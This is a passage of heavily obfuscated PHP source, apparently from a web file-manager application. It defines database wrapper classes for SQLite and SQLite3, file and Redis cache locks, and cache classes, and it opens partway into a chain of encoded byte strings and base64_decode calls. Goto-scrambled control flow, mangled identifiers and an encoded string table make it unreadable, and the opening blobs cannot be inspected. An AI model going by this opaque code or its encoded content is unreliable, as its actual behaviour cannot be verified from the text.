1b\x8c\xb\x69\x19\xf4".base64_decode('W60ZBqUkQP5HKRGTBzc9m2CjAL74qQrEIlL0o+mIyAb6JMd/UOAMKjgWERtTAA==')."\36\40\260\200\270\247\221\63\273\332\234\345\340\221\3\200\20\31\321\172\251\57\64\170\25\224\267\207\77\127\53\133\31\71\316\203\220\371\46\132\134\240\13\267\272\23".strrev('\\š¢óÀ³Õˆè%jDŸ»/$İ%køif~#±ÙMÚdtŒ¼NÃ*;Y›‰8Ç')."\301\140\213\77\340\306\336\52\363\242\121\56\301\270\45\57\252\251\336\337\70\124\234\247\301\345\365\345\305\101\143\227\306\60\167\226\203\243\274\115\250\225\56\237\317\337"."\62\124\53\274\65\163\171\113\320\321\52\127\176\147\22\32\325\144\323\63\202\240\234\44\163\112\274\105\246\244\270\327\44\236\307\254\42\20\307\125\247\16\305\330\207\331"."\247\273\305\356\214\116\130\122\20\64\124\151\44\145\7\62\4\12\275\167\262\305\315\230\145\324\41\315\142\34\217\17\217\35\246\23\147\1\216\26\13\42\61\302\44\24"."\x77\x57\x4\x98\x50\x10\x63\xa2\xfe\x34\x5f\x9f\x8f\x62\x39\x46\x60\x4b\xcf\xd2\x88\x69\x54\x87\x16\x11\xf4\xf5\x58\x76\x21\xb7\xb9\x8\x8e\x5\xeb\x24\xfc\x4d\xa2\xff\xf\xbd\xdf\x23"."\125\242\235\0\0"."".""."".base64_decode(''), 10, -8))); goto FÁƒÂÖŒ; aÖ¿×ˆöÇ¥: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto BÍšéĞ—Û„; BÍšéĞ—Û„: $D˜’œßÌ¹Î =& $_SERVER[œº]; global $in, $config; $this->config =& $config; goto BŒÄİ…»Ï; BŒÄİ…»Ï: $this->in =& $in; $this->values[$D˜’œßÌ¹Î[6]] =& $config; $this->values[$D˜’œßÌ¹Î[7]] =& $in; goto DÒ˜Äâ¢»˜; DÒ˜Äâ¢»˜: $this->tpl = TEMPLATE . MOD . $D˜’œßÌ¹Î[8]; $this->_classObjectID = mt_rand(0, 10000); goto D…çô‰Ê™; D…çô‰Ê™: } public function loadClass($BŠ ³À¾¡Ï) { if (1 === func_num_args()) { $this->{$BŠ ³À¾¡Ï} = new $BŠ ³À¾¡Ï(); } else { $b¯æ½†„Ã‰ = new ReflectionClass($BŠ ³À¾¡Ï); $EŠõœó¤Ã‡ = func_get_args(); array_shift($EŠõœó¤Ã‡); $this->{$BŠ ³À¾¡Ï} = $b¯æ½†„Ã‰->newInstanceArgs($EŠõœó¤Ã‡); } return $this->{$BŠ ³À¾¡Ï}; } protected function assign($eÜøÕ„¼ªº, $EÖˆÔÓºô) { $this->values[$eÜøÕ„¼ªº] = $EÖˆÔÓºô; } protected function display($bäï˜ÇÍç) { ob_end_clean(); extract($this->values); require $this->tpl . $bäï˜ÇÍç; } } class DbSqliteBase extends Db { public function __construct($eìã°‰¸· = '') { $eáˆÇïêøÕ =& $_SERVER[œº]; if (!extension_loaded($eáˆÇïêøÕ[9])) { think_exception(think_lang($eáˆÇïêøÕ[10]) . $eáˆÇïêøÕ[11]); } if (!empty($eìã°‰¸·)) { if (!isset($eìã°‰¸·[$eáˆÇïêøÕ[12]])) { $eìã°‰¸·[$eáˆÇïêøÕ[12]] = 438; } $this->config = $eìã°‰¸·; if (empty($this->config[$eáˆÇïêøÕ[13]])) { $this->config[$eáˆÇïêøÕ[13]] = array(); } } } public function connect($eæ¦¢ğí = '', $DµÊÔ«°Ÿ‘ = 0) { $Bö–×ÕŸ– =& $_SERVER[œº]; if (!isset($this->linkID[$DµÊÔ«°Ÿ‘])) { goto fÕˆâˆ’¡; bÓŒêˆíŸ: $this->linkID[$DµÊÔ«°Ÿ‘] = $c¤È”š×ò($eæ¦¢ğí[$Bö–×ÕŸ–[17]], $eæ¦¢ğí[$Bö–×ÕŸ–[12]]); if (!$this->linkID[$DµÊÔ«°Ÿ‘]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto f†ÀòŒÊ„Ê; f†ÀòŒÊ„Ê: @sqlite_busy_timeout($this->linkID[$DµÊÔ«°Ÿ‘], 30000); if (1 != think_config($Bö–×ÕŸ–[18])) { unset($this->config); } goto d††ŒÂÑÛÚ; fÕˆâˆ’¡: if (empty($eæ¦¢ğí)) { $eæ¦¢ğí = $this->config; } $aöøî–½ = !empty($eæ¦¢ğí[$Bö–×ÕŸ–[13]][$Bö–×ÕŸ–[14]]) ? $eæ¦¢ğí[$Bö–×ÕŸ–[13]][$Bö–×ÕŸ–[14]] : $this->pconnect; $c¤È”š×ò = $aöøî–½ ? $Bö–×ÕŸ–[15] : $Bö–×ÕŸ–[16]; goto bÓŒêˆíŸ; d††ŒÂÑÛÚ: } return $this->linkID[$DµÊÔ«°Ÿ‘]; } public function free() { $this->queryID = null; } public function query($aò¡È–”òÙ) { goto dÇî¢íù“Ï; bì˜Şƒ¯·Ì: $this->queryStr = $aò¡È–”òÙ; if ($this->queryID) { $this->free(); } think_action_status($eŒ‡­„ğ[19], 1); goto c­ÄÈ¶ê; dÇî¢íù“Ï: $eŒ‡­„ğ =& $_SERVER[œº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bì˜Şƒ¯·Ì; c­ÄÈ¶ê: think_status($eŒ‡­„ğ[20]); $this->queryID = sqlite_query($this->_linkID, $aò¡È–”òÙ); $this->debug(); goto EÌ£½ºà‰; EÌ£½ºà‰: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $B››³¯ŒÓ¶ = $this->getAll(); return $B››³¯ŒÓ¶; } goto C±òöãä¡Ò; C±òöãä¡Ò: } public function execute($b†ÖÈ‰) { goto Aœô§‹ä½í; FÅ¹ˆ¶äØ: $this->queryStr = $b†ÖÈ‰; if ($this->queryID) { $this->free(); } think_action_status($dä¿Î·©­¾[21], 1); goto F…È‘Øó£«; F…È‘Øó£«: think_status($dä¿Î·©­¾[20]); $EÓ¯º®‘ËÖ = sqlite_exec($this->_linkID, $b†ÖÈ‰); $this->debug(); goto F‹”ŠƒáÁ; Aœô§‹ä½í: $dä¿Î·©­¾ =& $_SERVER[œº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÅ¹ˆ¶äØ; F‹”ŠƒáÁ: if (!1 === $EÓ¯º®‘ËÖ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto AŒ˜À¤ğ¾; AŒ˜À¤ğ¾: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[œº][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Dã¥œï¸…  = sqlite_query($this->_linkID, $_SERVER[œº][23]); if (!$Dã¥œï¸… ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DŒŸ„Ô˜¯ = sqlite_query($this->_linkID, $_SERVER[œº][24]); if (!$DŒŸ„Ô˜¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aøî™¢×¦Ó = array(); if ($this->numRows > 0) { for ($BÓĞîº‰ˆ = 0; $BÓĞîº‰ˆ < $this->numRows; $BÓĞîº‰ˆ++) { $aøî™¢×¦Ó[$BÓĞîº‰ˆ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $aøî™¢×¦Ó; } public function getFields($cóØÜ‹õ…) { $f†â‡Ú»” =& $_SERVER[œº]; $dÛØÅ¾¯Ô¾ = $this->query($f†â‡Ú»”[25] . $cóØÜ‹õ… . $f†â‡Ú»”[26]); $BÂâ‹ÓÆ¸ = array(); if ($dÛØÅ¾¯Ô¾) { foreach ($dÛØÅ¾¯Ô¾ as $dÙëŠ’ÙÅ => $DƒÁ¼ğ™Š) { $BÂâ‹ÓÆ¸[$DƒÁ¼ğ™Š[$f†â‡Ú»”[27]]] = array($f†â‡Ú»”[28] => $DƒÁ¼ğ™Š[$f†â‡Ú»”[27]], $f†â‡Ú»”[29] => $DƒÁ¼ğ™Š[$f†â‡Ú»”[30]], $f†â‡Ú»”[31] => (bool) ($DƒÁ¼ğ™Š[$f†â‡Ú»”[32]] === $f†â‡Ú»”[33]), $f†â‡Ú»”[34] => $DƒÁ¼ğ™Š[$f†â‡Ú»”[35]], $f†â‡Ú»”[36] => strtolower($DƒÁ¼ğ™Š[$f†â‡Ú»”[37]]) == $f†â‡Ú»”[38], $f†â‡Ú»”[39] => strtolower($DƒÁ¼ğ™Š[$f†â‡Ú»”[40]]) == $f†â‡Ú»”[41]); } } return $BÂâ‹ÓÆ¸; } public function getTables($B±¦ø¬µÖ = '') { $EÍ×¬ô…ïæ =& $_SERVER[œº]; $a¸‰ˆÄØÅ² = $this->query($EÍ×¬ô…ïæ[42] . $EÍ×¬ô…ïæ[43] . $EÍ×¬ô…ïæ[44]); $F–™—²øõ = array(); foreach ($a¸‰ˆÄØÅ² as $dĞí—÷í’© => $F­ÙŠÈîÕ) { $F–™—²øõ[$dĞí—÷í’©] = current($F­ÙŠÈîÕ); } return $F–™—²øõ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $aòŒğ™ÎÒ¯ =& $_SERVER[œº]; $f”¥­Š™Â¢ = sqlite_last_error($this->_linkID); $this->error = $f”¥­Š™Â¢ . $aòŒğ™ÎÒ¯[4] . sqlite_error_string($f”¥­Š™Â¢); if ($aòŒğ™ÎÒ¯[33] != $this->queryStr) { $this->error .= LNG($aòŒğ™ÎÒ¯[45]) . $this->queryStr; } think_trace($this->error, $aòŒğ™ÎÒ¯[33], $aòŒğ™ÎÒ¯[46]); return $this->error; } public function escapeString($c»ô®«Ç§) { return sqlite_escape_string($c»ô®«Ç§); } public function parseLimit($C’ßõ…‹) { $eä¸ìŸÃÉ =& $_SERVER[œº]; $FƒÖí”ª… = $eä¸ìŸÃÉ[33]; if (!empty($C’ßõ…‹)) { $C’ßõ…‹ = explode($eä¸ìŸÃÉ[47], $C’ßõ…‹); if (count($C’ßõ…‹) > 1) { $FƒÖí”ª… .= $eä¸ìŸÃÉ[48] . $C’ßõ…‹[1] . $eä¸ìŸÃÉ[49] . $C’ßõ…‹[0] . $eä¸ìŸÃÉ[50]; } else { $FƒÖí”ª… .= $eä¸ìŸÃÉ[48] . $C’ßõ…‹[0] . $eä¸ìŸÃÉ[50]; } } return $FƒÖí”ª…; } } class DbSqlite3Base extends Db { public function __construct($d‰Ñ¬®È© = '') { $d²æ¹™Ø  =& $_SERVER[œº]; if (!class_exists($d²æ¹™Ø [51])) { think_exception(think_lang($d²æ¹™Ø [10]) . $d²æ¹™Ø [52]); } if (!empty($d‰Ñ¬®È©)) { if (!isset($d‰Ñ¬®È©[$d²æ¹™Ø [12]])) { $d‰Ñ¬®È©[$d²æ¹™Ø [12]] = 438; } $this->config = $d‰Ñ¬®È©; if (empty($this->config[$d²æ¹™Ø [13]])) { $this->config[$d²æ¹™Ø [13]] = array(); } } } public function connect($EØ–¯…Äš = '', $e¯¾³šÚ… = 0) { $DÆ¶ÀŠÊ•¨ =& $_SERVER[œº]; if (!isset($this->linkID[$e¯¾³šÚ…])) { if (empty($EØ–¯…Äš)) { $EØ–¯…Äš = $this->config; } $this->linkID[$e¯¾³šÚ…] = new SQLite3($EØ–¯…Äš[$DÆ¶ÀŠÊ•¨[17]]); if (!$this->linkID[$e¯¾³šÚ…]) { think_exception($this->linkID[$e¯¾³šÚ…]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$e¯¾³šÚ…]->busyTimeout(30000); if (1 != think_config($DÆ¶ÀŠÊ•¨[18])) { unset($this->config); } } return $this->linkID[$e¯¾³šÚ…]; } public function free() { $this->queryID = null; } public function query($f…Úìà¡‹©) { goto aèèß‹ªº; aèèß‹ªº: $FÂÌ±ÙºÓ‹ =& $_SERVER[œº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÌÚâë§Ãó; DÀ†Ö˜«À‰: if (!1 === $this->queryID) { $this->error(); return !1; } else { $d‹è‹ìÑÈƒ = $this->getAll(); $this->numRows = count($d‹è‹ìÑÈƒ); return $d‹è‹ìÑÈƒ; } goto F†¼¿íïš´; EÌÚâë§Ãó: $this->queryStr = $f…Úìà¡‹©; if ($this->queryID) { $this->free(); } think_action_status($FÂÌ±ÙºÓ‹[19], 1); goto dä£î×İÉÑ; dä£î×İÉÑ: think_status($FÂÌ±ÙºÓ‹[20]); $this->queryID = $this->_linkID->query($f…Úìà¡‹©); $this->debug(); goto DÀ†Ö˜«À‰; F†¼¿íïš´: } public function execute($D¡°·Åà¹) { goto Fó¸Ö‹¸; CÛïíï‚¿¾: if (!1 === $Aß¦ÊĞ˜²Ï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto c¿Ó‚Ğí»; f˜Êõ¾Ú¥Ê: think_status($dÎÒ˜ßÅ¸ï[20]); $Aß¦ÊĞ˜²Ï = $this->_linkID->exec($D¡°·Åà¹); $this->debug(); goto CÛïíï‚¿¾; Fó¸Ö‹¸: $dÎÒ˜ßÅ¸ï =& $_SERVER[œº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aöâ§²°ôÒ; aöâ§²°ôÒ: $this->queryStr = $D¡°·Åà¹; if ($this->queryID) { $this->free(); } think_action_status($dÎÒ˜ßÅ¸ï[21], 1); goto f˜Êõ¾Ú¥Ê; c¿Ó‚Ğí»: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[œº][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FÍ‰ÑÒ„Ğ = $this->_linkID->query($_SERVER[œº][23]); if (!$FÍ‰ÑÒ„Ğ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $f½¹×® = $this->_linkID->query($_SERVER[œº][24]); if (!$f½¹×®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BÓ¹äË’á¸ = array(); while ($B–Œï’³íÖ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $BÓ¹äË’á¸[] = $B–Œï’³íÖ; } $this->queryID->reset(); return $BÓ¹äË’á¸; } public function getFields($BÙ×ÄŞâë…) { $F¢¹È»ÒÓâ =& $_SERVER[œº]; $dêëˆÖØ”¼ = $this->query($F¢¹È»ÒÓâ[25] . $BÙ×ÄŞâë… . $F¢¹È»ÒÓâ[26]); $EªçáÒ¾“ = array(); if ($dêëˆÖØ”¼) { foreach ($dêëˆÖØ”¼ as $eñ¸—ÒÕƒ => $dÅâ©ÀË²”) { $EªçáÒ¾“[$dÅâ©ÀË²”[$F¢¹È»ÒÓâ[28]]] = array($F¢¹È»ÒÓâ[28] => $dÅâ©ÀË²”[$F¢¹È»ÒÓâ[28]], $F¢¹È»ÒÓâ[29] => $dÅâ©ÀË²”[$F¢¹È»ÒÓâ[29]], $F¢¹È»ÒÓâ[31] => (bool) ($dÅâ©ÀË²”[$F¢¹È»ÒÓâ[31]] === $F¢¹È»ÒÓâ[33]), $F¢¹È»ÒÓâ[34] => $dÅâ©ÀË²”[$F¢¹È»ÒÓâ[53]], $F¢¹È»ÒÓâ[36] => (bool) $dÅâ©ÀË²”[$F¢¹È»ÒÓâ[54]], $F¢¹È»ÒÓâ[39] => (bool) $dÅâ©ÀË²”[$F¢¹È»ÒÓâ[54]]); } } return $EªçáÒ¾“; } public function getTables($B±ñ‘îŠÅß = '') { $FŠŸ‹×øä— =& $_SERVER[œº]; $cï±ÒµÉê• = $this->query($FŠŸ‹×øä—[42] . $FŠŸ‹×øä—[43] . $FŠŸ‹×øä—[44]); $E‡”ò‡ğÒÀ = array(); foreach ($cï±ÒµÉê• as $b“ßÑ¶ ¬š => $C˜œ‚Õìáİ) { $E‡”ò‡ğÒÀ[$b“ßÑ¶ ¬š] = current($C˜œ‚Õìáİ); } return $E‡”ò‡ğÒÀ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D¡î™Ûö™ =& $_SERVER[œº]; $this->error = $this->_linkID->lastErrorMsg(); if ($D¡î™Ûö™[33] != $this->queryStr) { $this->error .= LNG($D¡î™Ûö™[45]) . $this->queryStr; } think_trace($this->error, $D¡î™Ûö™[33], $D¡î™Ûö™[46]); return $this->error; } public function escapeString($dËŸ² ùë ) { $aäˆ¦ÕâÉŠ =& $_SERVER[œº]; if ($this->_linkID) { return $this->_linkID->escapeString($dËŸ² ùë ); } return str_ireplace($aäˆ¦ÕâÉŠ[55], $aäˆ¦ÕâÉŠ[56], $dËŸ² ùë ); } public function parseLimit($f•Ä¡îŠ) { $e¿ôãğ¬ =& $_SERVER[œº]; $eÑªì½Õª· = $e¿ôãğ¬[33]; if (!empty($f•Ä¡îŠ)) { $f•Ä¡îŠ = explode($e¿ôãğ¬[47], $f•Ä¡îŠ); if (count($f•Ä¡îŠ) > 1) { $eÑªì½Õª· .= $e¿ôãğ¬[48] . $f•Ä¡îŠ[1] . $e¿ôãğ¬[49] . $f•Ä¡îŠ[0] . $e¿ôãğ¬[50]; } else { $eÑªì½Õª· .= $e¿ôãğ¬[48] . $f•Ä¡îŠ[0] . $e¿ôãğ¬[50]; } } return $eÑªì½Õª·; } } goto C™¢Ë™‚©ø; EÏÅŞ¿¯¾ø: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $D‰µïàµ¯Ò =& $_SERVER[œº]; $Díëä¢ƒ£³ = $GLOBALS[$D‰µïàµ¯Ò[6]][$D‰µïàµ¯Ò[347]]; self::$cachePath = $Díëä¢ƒ£³[$D‰µïàµ¯Ò[193]][$D‰µïàµ¯Ò[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($cÙŞ’’ç¦‘, $D‰º¶¯„£¹ = 0) { goto b÷¯ùŒìĞŠ; b÷¯ùŒìĞŠ: $dŞ¶Èö™µÌ =& $_SERVER[œº]; $dÍ÷ƒÊ‘² = microtime(!0); $dãÅåŒâˆ = $dÍ÷ƒÊ‘² + $D‰º¶¯„£¹ + 0.0001; goto F´ïàÆ¦Ü; F´ïàÆ¦Ü: $d¹ ’Å— = rtrim(self::$cachePath, $dŞ¶Èö™µÌ[8]) . $dŞ¶Èö™µÌ[818] . md5($cÙŞ’’ç¦‘) . $dŞ¶Èö™µÌ[815]; if (file_exists($d¹ ’Å—) && filemtime($d¹ ’Å—) && filemtime($d¹ ’Å—) < time() - 10) { @unlink($d¹ ’Å—); } do { if (file_exists($d¹ ’Å—)) { cacheLockWait(); continue; } $dÀâ³™¨š¯ = fopen($d¹ ’Å—, $dŞ¶Èö™µÌ[819]); if (!$dÀâ³™¨š¯) { return !1; } $d“›Î¹ÏÀ‚ = flock($dÀâ³™¨š¯, LOCK_EX | LOCK_NB); self::$caches[$cÙŞ’’ç¦‘] = array($dŞ¶Èö™µÌ[820] => $dÀâ³™¨š¯, $dŞ¶Èö™µÌ[193] => $d¹ ’Å—); fwrite($dÀâ³™¨š¯, $dãÅåŒâˆ); clearstatcache(); if ($dÀâ³™¨š¯ && $d“›Î¹ÏÀ‚) { return !0; } cacheLockWait(); } while (microtime(!0) < $dãÅåŒâˆ); goto b‘™Åó…ï½; b‘™Åó…ï½: $this->unlock($cÙŞ’’ç¦‘); return !1; goto DôØ›­Ê·; DôØ›­Ê·: } public function lockGet($a…¹à¿Ë‘) { $Dñµ‰‹Ê‰” =& $_SERVER[œº]; $BÍÒñí„îƒ = rtrim(self::$cachePath, $Dñµ‰‹Ê‰”[8]) . $Dñµ‰‹Ê‰”[818] . md5($a…¹à¿Ë‘) . $Dñµ‰‹Ê‰”[815]; return file_exists($BÍÒñí„îƒ); } public function unlock($b¶ä¦·¢İ¿) { goto F´‰±Šã£ô; dŞò ¯‚¢: @flock($dÊô³Œ†¶[$F†‚òÒ„ÖÚ[820]], LOCK_UN); @fclose($dÊô³Œ†¶[$F†‚òÒ„ÖÚ[820]]); @unlink($dÊô³Œ†¶[$F†‚òÒ„ÖÚ[193]]); goto EñÔ¦ğœ; F´‰±Šã£ô: $F†‚òÒ„ÖÚ =& $_SERVER[œº]; $dÊô³Œ†¶ = self::$caches[$b¶ä¦·¢İ¿]; if (!$dÊô³Œ†¶) { return; } goto dŞò ¯‚¢; EñÔ¦ğœ: unset(self::$caches[$b¶ä¦·¢İ¿]); goto DÕá—ÀÆˆâ; DÕá—ÀÆˆâ: } } class CacheLockRedis { public function lock($e”Î÷¬ä÷™, $cá›‚Íí‚¼ = 10) { $f®í†ÈÈÓÃ = Cache::init(); $b”ï³™®ÜÅ = microtime(!0) + $cá›‚Íí‚¼; while (microtime(!0) < $b”ï³™®ÜÅ) { $BÆÏÂ¾¹ŠÉ = $f®í†ÈÈÓÃ->get($e”Î÷¬ä÷™); if (!$BÆÏÂ¾¹ŠÉ) { $eŞˆÆÊ—Ã = $f®í†ÈÈÓÃ->setLock($e”Î÷¬ä÷™, $b”ï³™®ÜÅ, $cá›‚Íí‚¼); if ($eŞˆÆÊ—Ã) { return !0; } } else { if ($BÆÏÂ¾¹ŠÉ < microtime(!0)) { $f®í†ÈÈÓÃ->set($e”Î÷¬ä÷™, $b”ï³™®ÜÅ, $cá›‚Íí‚¼ * 2); if ($f®í†ÈÈÓÃ->get($e”Î÷¬ä÷™) === $BÆÏÂ¾¹ŠÉ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($f‡ØÒç‘Ô) { return Cache::init()->get($f‡ØÒç‘Ô); } public function unlock($dáÖïœš») { return Cache::init()->remove($dáÖïœš»); } } goto CÛ†¢áÙÀÌ; B¡¢à´Ç¸¯: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Aôò§˜³Ì; Aôò§˜³Ì: $c…¾·³§È =& $_SERVER[œº]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto e×÷£ŞŸğ; d˜ÉÁæâÖ: switch ($CÆÅóÒ½°[$c…¾·³§È[792]]) { case $c…¾·³§È[17]: self::$handle = Model($c…¾·³§È[794]); break; case $c…¾·³§È[795]: self::$handle = new CacheRedis($a‚ˆö³Ÿí, $dªù‘²œ); break; case $c…¾·³§È[796]: self::$handle = new CacheMemcached($a‚ˆö³Ÿí, $dªù‘²œ); break; case $c…¾·³§È[193]: self::$handle = new CacheFile($a‚ˆö³Ÿí, $dªù‘²œ); break; default: break; } return self::$handle; goto c”ë¼Éàøà; e×÷£ŞŸğ: $CÆÅóÒ½° = $GLOBALS[$c…¾·³§È[6]][$c…¾·³§È[347]]; $a‚ˆö³Ÿí = $CÆÅóÒ½°[$CÆÅóÒ½°[$c…¾·³§È[792]]]; $dªù‘²œ = $CÆÅóÒ½°[$c…¾·³§È[793]]; goto d˜ÉÁæâÖ; c”ë¼Éàøà: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($eŞ“ªç‰”) { if (is_array($eŞ“ªç‰”) || is_object($eŞ“ªç‰”)) { $eŞ“ªç‰” = json_encode($eŞ“ªç‰”); } $eŞ“ªç‰” = rawurlencode($eŞ“ªç‰”); return md5(KOD_SITE_ID . $_SERVER[œº][71] . $eŞ“ªç‰”); } public static function get($A¨†‹ãºö, $eŞÎ§ŞòÔŠ = false) { $Eõ¦Â·ã– = self::key($A¨†‹ãºö); if ($eŞÎ§ŞòÔŠ) { return unserialize(self::init()->get($Eõ¦Â·ã–)); } if (!isset(self::$memoryCache[$Eõ¦Â·ã–])) { $Aï•¼ÂœÄ˜ = self::init()->get($Eõ¦Â·ã–); self::$memoryCache[$Eõ¦Â·ã–] = unserialize($Aï•¼ÂœÄ˜); } return self::$memoryCache[$Eõ¦Â·ã–]; } public static function set($Cêñß¢, $AÃß´’·Œ, $F˜·ß¢Šœ¨ = false) { goto F–İ÷Øêò; f¾Œ¡Œ¥ÒË: CacheLock::unlock($Cêñß¢); return $A³ÀãÖâæ; goto CñŠ»êŠ›”; F–İ÷Øêò: $aòŸÊßáªÍ = self::key($Cêñß¢); if (isset(self::$memoryCache[$aòŸÊßáªÍ]) && self::$memoryCache[$aòŸÊßáªÍ] === $AÃß´’·Œ) { return !0; } if ($F˜·ß¢Šœ¨ === 0) { self::$memoryCache[$aòŸÊßáªÍ] = $AÃß´’·Œ; return !0; } goto bÙ„ƒ•»„¹; bÙ„ƒ•»„¹: CacheLock::lock($Cêñß¢); $A³ÀãÖâæ = self::init()->set($aòŸÊßáªÍ, serialize($AÃß´’·Œ), $F˜·ß¢Šœ¨); self::$memoryCache[$aòŸÊßáªÍ] = $AÃß´’·Œ; goto f¾Œ¡Œ¥ÒË; CñŠ»êŠ›”: } public static function getCall($aë†¿¥²ì, $B’Õ«‰«Î†, $Câ“¸×ŠÄ…, $Eèö‚šÛ = array()) { goto cƒé¾ÅÒ³‰; C¸Ë²´Àç: return $EÙéáª…ğ; goto f»½¾×¢îš; cƒé¾ÅÒ³‰: $c³‚Óæéëğ =& $_SERVER[œº]; $EÙéáª…ğ = self::get($aë†¿¥²ì); if ($EÙéáª…ğ || $EÙéáª…ğ === $c³‚Óæéëğ[33]) { return $EÙéáª…ğ; } goto eÜÌÎ¨ƒ„£; eÜÌÎ¨ƒ„£: $EÙéáª…ğ = call_user_func_array($Câ“¸×ŠÄ…, $Eèö‚šÛ); $EÙéáª…ğ = $EÙéáª…ğ ? $EÙéáª…ğ : $c³‚Óæéëğ[33]; self::set($aë†¿¥²ì, $EÙéáª…ğ, $B’Õ«‰«Î†); goto C¸Ë²´Àç; f»½¾×¢îš: } public static function remove($A…Ì•†…”Ö) { goto AÄäÅ…çŠÑ; b±ò„©Ú­´: return $AÔ¨ÔÜëé‹; goto dµñ·ÊÒ‰–; B¤¤ë²Â¢ó: CacheLock::lock($A…Ì•†…”Ö); $AÔ¨ÔÜëé‹ = self::init()->remove($FŸ ›¸Ãê›); CacheLock::unlock($A…Ì•†…”Ö); goto b±ò„©Ú­´; AÄäÅ…çŠÑ: $FŸ ›¸Ãê› = self::key($A…Ì•†…”Ö); unset(self::$memoryCache[$FŸ ›¸Ãê›]); self::clearTimeout(); goto B¤¤ë²Â¢ó; dµñ·ÊÒ‰–: } public static function removeMemory($d‹ÁßìáÈ‘) { $EËÖŸˆ÷Ğš = self::key($d‹ÁßìáÈ‘); unset(self::$memoryCache[$EËÖŸˆ÷Ğš]); } public static function clearMemory($Cœ±‡£Ë = false) { if ($Cœ±‡£Ë) { $Cœ±‡£Ë = self::key($Cœ±‡£Ë); unset(self::$memoryCache[$Cœ±‡£Ë]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[œº][797])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[œº][798])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($AŒÆå‰ó…Œ, $CÂ™‘‚Ö) { $CÚãË¨£Èˆ =& $_SERVER[œº]; $this->cachePath = $AŒÆå‰ó…Œ[$CÚãË¨£Èˆ[76]]; $this->prefix = $CÚãË¨£Èˆ[799]; $this->cacheTime = $CÂ™‘‚Ö; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($c½¦œÎÁº) { $AêÆŠïÕª± =& $_SERVER[œº]; $c½¦œÎÁº = str_replace(array($AêÆŠïÕª±[800], $AêÆŠïÕª±[97], $AêÆŠïÕª±[70]), $AêÆŠïÕª±[801], $c½¦œÎÁº); return $this->cachePath . $AêÆŠïÕª±[802] . $c½¦œÎÁº . $AêÆŠïÕª±[803]; } public function set($E‰©ÛÆ¶«½, $DŸ˜®”ùÀ, $Bõê¼£ó† = false) { $BŞ ‚Àºµ = $this->getFile($E‰©ÛÆ¶«½); if (file_put_contents($BŞ ‚Àºµ, $this->prefix . $DŸ˜®”ùÀ, LOCK_EX)) { @touch($BŞ ‚Àºµ, intval(time() + $Bõê¼£ó†)); clearstatcache(); return !0; } @unlink($BŞ ‚Àºµ); return !1; } public function get($F‡¢½Ÿ–×º) { $CÀàİï¾§Í = $this->getFile($F‡¢½Ÿ–×º); if (file_exists($CÀàİï¾§Í) && filemtime($CÀàİï¾§Í) < time()) { @unlink($CÀàİï¾§Í); return !1; } $c—¾îœ¤²Ø = @file_get_contents($CÀàİï¾§Í); return substr($c—¾îœ¤²Ø, strlen($this->prefix)); } public function remove($CË£±Øäè²) { $AˆÓ¢ºÕ‹½ = $this->getFile($CË£±Øäè²); return @unlink($AˆÓ¢ºÕ‹½); } public function deleteAll() { $CÏ™¢Ó§Ã =& $_SERVER[œº]; $cÜË½†ÍÇ– = scandir($this->cachePath); foreach ($cÜË½†ÍÇ– as $F¶¢•ó¦Æ†) { $eóÕ±„¾ò‰ = $this->cachePath . $F¶¢•ó¦Æ†; if (strpos($eóÕ±„¾ò‰, $CÏ™¢Ó§Ã[803]) && strpos($eóÕ±„¾ò‰, $CÏ™¢Ó§Ã[804])) { @unlink($eóÕ±„¾ò‰); } } } public function clearTimeout() { $E¶‡æ¸åºŠ =& $_SERVER[œº]; $aÓ Ùé£½ = scandir($this->cachePath); foreach ($aÓ Ùé£½ as $B°”ƒœ¹) { $fŸ¯êÌÏï = $this->cachePath . $B°”ƒœ¹; if (strpos($fŸ¯êÌÏï, $E¶‡æ¸åºŠ[803]) && strpos($fŸ¯êÌÏï, $E¶‡æ¸åºŠ[804]) && filemtime($fŸ¯êÌÏï) < time()) { 